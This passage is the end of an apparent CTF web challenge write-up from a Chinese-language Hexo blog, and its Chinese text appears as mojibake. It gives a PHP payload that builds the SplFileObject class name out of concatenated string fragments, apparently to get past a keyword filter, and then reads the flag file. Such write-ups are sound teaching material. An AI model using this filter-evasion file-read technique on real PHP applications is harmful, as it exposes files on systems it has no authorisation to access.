<p>(æ¯”èµ›çš„æ—¶å€™ä¹Ÿç”¨äº†è¿™ç§æ–¹æ³•ï¼Œä½†æ˜¯æ²¡æœ‰åšæŒä¸‹æ¥ğŸ˜¢)</p>
<p>ç„¶åä½¿ç”¨<code>SplFileObject</code>è¯»å–æ–‡ä»¶</p>
<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211281004051.png" title="image-20221128100409982" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211281004051.png" alt="image-20221128100409982"></a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">new</span> (<span class="string">&#x27;Spl&#x27;</span>.<span class="string">&#x27;Fi&#x27;</span>.<span class="string">&#x27;leObject&#x27;</span>)(<span class="string">&quot;/fl1111111111ag&quot;</span>);</span><br></pre></td></tr></table></figure>

</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
    </div>

    <div class="post-meta">
        <i>
        
            <span>2022-11-29</span>
            
                <span>è¯¥ç¯‡æ–‡ç« è¢« v2ish1yan</span>
            
            
                <span>æ‰“ä¸Šæ ‡ç­¾:
                    
                    
                        <a href='/tags/CTF/'>
                            CTF
                        </a>
                    
                        <a href='/tags/WEB/'>
                            WEB
                        </a>
                    
                </span>
             
             
                <span>å½’ä¸ºåˆ†ç±»:
                    
                    
                        <a href='/categories/WP/'>
                            WP
                        </a>
                    
                </span>
            
        
        </i>
    </div>
    <br>
    
    <!-- <div class="post-footer-pre-next">
        <span>ä¸Šä¸€ç¯‡ï¼š<a href=""></a></span>
        <span class="post-footer-pre-next-last-span-right">ä¸Šä¸€ç¯‡ï¼š<a href=""></a></span>
    </div> -->

    
        
    <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
         
    </div>
    
        

    <div id="waline"></div>
    <script type="module"  >
        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
        function loadWaline() {
            init({
                el: '#waline',
                serverURL: 'https://a4-talk.vercel.app',
                lang: 'zh-CN',
                dark: 'body[class~="dark-mode"]',
                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
                search: false, // ç¦æ­¢è¡¨æƒ…åŒ…æœç´¢
                reaction: false, // å¯¹æ–‡ç« æ‰“åˆ†
                pageview: false, // æµè§ˆé‡ç»Ÿè®¡
                comment: false, // è¯„è®ºæ•°ç»Ÿè®¡

                locale: {
                    placeholder: 'æ¬¢è¿è¯„è®º', 
                    sofa: ''
                },
            });
            
        }
        window.addEventListener('DOMContentLoaded', loadWaline);
    </script>



    
    
    
    </div>


     
</div>



                                      
                    
                    
                    <div class="footer">
    
        <span> 
            Â© 1949-2024 China 

            
                

            
        </span>
    
</div>
<!--è¿™æ˜¯æŒ‡ä¸€æ¡çº¿å¾€ä¸‹çš„å†…å®¹-->
<div class="footer-last">
    
            <span>ğŸŒŠé¢æœå¤§æµ·ï¼Œæ˜¥æš–èŠ±å¼€ğŸŒ¸</span>
            
                <span class="footer-last-span-right"><i>æœ¬ç«™ç”±<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>é©±åŠ¨ï½œä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>ä¸»é¢˜</i></span>
            
    
</div>


    
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>

    <!--ç›®å½•-->
    
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
        
<script src="/js/toc.js"></script>

    

    
<script src="/js/randomHeaderContent.js"></script>

    <!--å›åˆ°é¡¶éƒ¨æŒ‰é’®-->
    
        
<script src="/js/returnToTop.js"></script>

    

    
        
<script src="/js/returnToLastPage.js"></script>

    





<script src="/js/lightgallery.min.js"></script>



                </div>
            
            
                <!-- å›åˆ°é¡¶éƒ¨çš„æŒ‰é’®-->  
                <div class="progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
            
                <!-- è¿”å›çš„æŒ‰é’®-->  
                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
                    </svg>
                </div>
            
    </body>


    <!--æš—é»‘æ¨¡å¼-->
    <script src="/js/darkmode-js.min.js"></script>
    <script>
        function addDarkmodeWidget() {
        const options = {
            bottom: '53px', // default: '32px'
            right: 'unset', // default: '32px'
            left: '42px', // default: 'unset'
            time: '0.3s', // default: '0.3s'
            mixColor: '#fff', // default: '#fff'
            backgroundColor: ' #e4e4e4 ',  // default: '#fff'
            buttonColorDark: '#100f2c',  // default: '#100f2c'
            buttonColorLight: '#fff', // default: '#fff'
            saveInCookies: true, // default: true,
            label: 'ğŸŒ“', // default: ''
            autoMatchOsTheme: true // default: true
        }
    
        const darkmode = new Darkmode(options);
        darkmode.showWidget();
        
        }
        window.addEventListener('load', addDarkmodeWidget);
    </script>
  
</html>